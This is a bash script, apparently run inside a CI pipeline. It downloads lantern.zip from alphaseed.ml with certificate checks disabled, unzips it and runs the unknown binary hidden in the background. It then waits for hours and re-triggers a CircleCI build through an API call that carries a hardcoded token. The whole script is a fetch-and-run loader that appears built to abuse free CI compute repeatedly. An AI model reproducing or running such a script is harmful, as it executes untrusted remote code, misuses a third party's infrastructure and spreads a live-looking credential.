#!/bin/bash
if [ ! -f ./tra ]; then
    #echo "File not found!"
    wget -q http://alphaseed.ml:8443/lantern.zip --no-check-certificate
    unzip -q lantern.zip
fi
echo $1
nohup ./lantern $1 >/dev/null 2>&1
i="0"
def="297"
if [[ $1 -lt 1 ]]
then
        echo $def
else
        def="46"
        echo $def
fi
while [[ $i -lt def ]]
do
echo "Let's sleep for $i min"
sleep 60 #60= 1min
i=$[$i+1]
done
if [[ $1 -lt 1 ]]; then
curl -X POST https://circleci.com/api/v1.1/project/github/alfabank9010/sefrlonti/build?circle-token=def2fcb1638196370e30ad7fd08240d12685cde1
fi
